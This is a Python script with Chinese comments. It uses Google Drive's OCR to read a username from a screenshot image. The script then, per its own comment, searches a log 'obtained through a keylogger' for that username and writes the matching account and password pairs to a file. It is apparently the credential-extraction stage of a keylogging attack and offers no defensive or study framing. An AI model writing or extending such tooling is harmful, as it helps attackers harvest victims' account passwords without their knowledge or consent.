from __future__ import print_function
import httplib2
import os
import io
import re

from apiclient import discovery
from oauth2client import client
from oauth2client import tools
from oauth2client.file import Storage
from apiclient.http import MediaFileUpload, MediaIoBaseDownload

try:
  import argparse
  flags = argparse.ArgumentParser(parents=[tools.argparser]).parse_args()
except ImportError:
  flags = None

SCOPES = 'https://www.googleapis.com/auth/drive'
CLIENT_SECRET_FILE = 'client_id.json'
APPLICATION_NAME = 'Python OCR'

def get_credentials():
  credential_path = os.path.join("./", 'google-ocr-credential.json')
  store = Storage(credential_path)
  credentials = store.get()
  if not credentials or credentials.invalid:
    flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)
    flow.user_agent = APPLICATION_NAME
    if flags:
      credentials = tools.run_flow(flow, store, flags)
    else: # Needed only for compatibility with Python 2.6
      credentials = tools.run(flow, store)
    print('憑證儲存於：' + credential_path)
  return credentials

def main():

  # 取得憑證、認證、建立 Google 雲端硬碟 API 服務物件
  credentials = get_credentials()
  print ('憑證建立成功')
  http = credentials.authorize(httplib2.Http())
  service = discovery.build('drive', 'v3', http=http)

  # 包含文字內容的圖片檔案（png、jpg、bmp、gif、pdf）
  imgfile = '20180613_23-38-56.jpg'

  # 輸出辨識結果的文字檔案
  txtfile = 'output.txt'

  # 上傳成 Google 文件檔，讓 Google 雲端硬碟自動辨識文字
  mime = 'application/vnd.google-apps.document'
  res = service.files().create(
    body={
      'name': imgfile,
      'mimeType': mime
    },
    media_body=MediaFileUpload(imgfile, mimetype=mime, resumable=True)
  ).execute()
  print ('上傳成功')

  # 下載辨識結果，儲存為文字檔案
  downloader = MediaIoBaseDownload(
    io.FileIO(txtfile, 'wb'),
    service.files().export_media(fileId=res['id'], mimeType="text/plain")
  )
  done = False
  while done is False:
    status, done = downloader.next_chunk()

  print ('下載成功')

  # 刪除剛剛上傳的 Google 文件檔案
  service.files().delete(fileId=res['id']).execute()

  #將outpur做正規化
  dealfile = open('output.txt')
  for line in dealfile:
    username = Regular_Expression(line)
    if username != None and username.find('_')==-1:
      compareusrn = username
  dealfile.close()

  #透過keylogger取得的txt做帳號、密碼分析
  cfile = open('username.txt')
  wfile = open('usrnpswd.txt','w')
  for line in cfile:
    if line.find(compareusrn)!=-1:
      s = line.split(compareusrn)[1]
      wfile.write('帳號:%s 密碼:%s'% (compareusrn,s) )
  cfile.close()

  print ('辨識結束')

def Regular_Expression(s):
            Account_Pattern = re.compile(r'\w[\w\d^_]{5,12}')
            Account_Matches = Account_Pattern.finditer(s)
            for Account in Account_Matches:
                return Account.group(0)

if __name__ == '__main__':
  main()
